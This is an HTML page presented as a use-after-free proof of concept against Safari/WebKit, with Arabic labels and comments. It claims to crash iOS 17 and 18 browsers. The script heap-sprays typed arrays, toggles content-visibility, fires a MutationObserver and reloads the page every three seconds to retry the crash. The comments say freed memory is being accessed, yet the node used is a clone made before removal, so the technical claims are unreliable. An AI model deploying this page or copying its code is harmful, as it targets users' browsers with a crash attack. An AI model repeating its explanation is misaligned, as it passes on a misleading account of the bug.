<!DOCTYPE html>
<html>
<head>
    <title>WebKit Bug #287908 — UAF PoC</title>
    <style>
        body { background: #0a0a1a; color: #fff; font-family: monospace; padding: 20px; }
        .container { width: 200px; height: 200px; background: #333; }
        .child { width: 100px; height: 100px; background: #00f; }
        button { background: #27ae60; color: #fff; padding: 15px 30px; font-size: 18px; border: none; cursor: pointer; margin: 10px 0; }
        pre { background: #111; padding: 15px; border: 1px solid #333; min-height: 150px; color: #00ff00; }
    </style>
</head>
<body>
    <h1>WebKit Bug #287908 — Use-After-Free PoC</h1>
    <p>هذا الـ PoC يسبب crash في Safari. يعمل على iOS 17.x → 18.x والإصدارات القديمة.</p>
    
    <div class="container" id="container">
        <div class="child" id="child"></div>
    </div>
    
    <button id="runBtn">💥 تشغيل UAF</button>
    <pre id="log">[•] اضغط الزر...</pre>

    <script>
        const container = document.getElementById('container');
        const child = document.getElementById('child');
        const log = document.getElementById('log');
        
        function out(msg) { 
            log.innerHTML += msg + '\n'; 
            log.scrollTop = log.scrollHeight;
        }

        document.getElementById('runBtn').onclick = () => {
            out('═════════════════════════');
            out('▶ تشغيل CVE-2025-43368 UAF');
            
            // === Heap Spray أولي ===
            for (let i = 0; i < 10000; i++) {
                let arr = new Uint8Array(0x100);
                for (let j = 0; j < arr.length; j++) {
                    arr[j] = 0x41;
                }
            }
            
            // === إثارة UAF عبر content-visibility ===
            out('① تعيين content-visibility: hidden');
            container.style.contentVisibility = 'hidden';
            
            out('② إزالة الطفل من DOM (تحرير الذاكرة)');
            const removedChild = child.cloneNode(true);
            child.remove();
            
            // === حقن مراقب DOM ===
            const observer = new MutationObserver((mutations) => {
                for (let mutation of mutations) {
                    if (mutation.type === 'childList') {
                        // هنا: المحاولة للوصول إلى child المحذوف = UAF
                        out('③ ⚠️ UAF triggered — محاولة الوصول لطفل محذوف!');
                        try {
                            // الوصول إلى الذاكرة المُحررة
                            removedChild.style.display = 'block';
                            removedChild.style.background = '#ff0000';
                            container.appendChild(removedChild);
                            out('④ Safari قد يتعطل الآن...');
                        } catch(e) {
                            out(`❌ خطأ: ${e.message}`);
                        }
                    }
                }
            });
            
            // === تشغيل الـ observer ===
            observer.observe(container, { 
                childList: true, 
                subtree: true,
                attributes: true 
            });
            
            // === إعادة content-visibility ← يسبب استدعاء الـ observer ===
            setTimeout(() => {
                out('⑤ إعادة content-visibility: auto');
                container.style.contentVisibility = 'auto';
                
                // === هجوم بالذاكرة (Heap Spray) ===
                out('⑥ تشغيل heap spray للتحكم بالذاكرة المُحررة...');
                let spray = [];
                for (let i = 0; i < 20000; i++) {
                    let buf = new Uint8Array(0x100);
                    for (let j = 0; j < buf.length; j++) {
                        buf[j] = 0x42 + (i % 10);
                    }
                    spray.push(buf);
                }
                
                out('⑦ محاولة إعادة إضافة الطفل...');
                try {
                    container.appendChild(removedChild);
                    out('✅ تمت الإضافة بنجاح');
                    
                    // الآن: child يشير إلى ذاكرة قد تكون محررة
                    // الوصول إليها قد يسبب crash
                    out('⑧ الوصول إلى child بعد UAF...');
                    removedChild.click();
                    removedChild.style.background = '#ff0000';
                    
                } catch(e) {
                    out(`✅ Safari يجب أن يتعطل: ${e.message}`);
                }
                
                out('');
                out('═════════════════════════');
                out('إذا لم يتعطل Safari بعد 3 ثوانِ، أعد المحاولة');
                
                // تكرار العملية لزيادة فرصة الـ crash
                setTimeout(() => {
                    location.reload();
                }, 3000);
            }, 100);
        };
    </script>
</body>
</html>
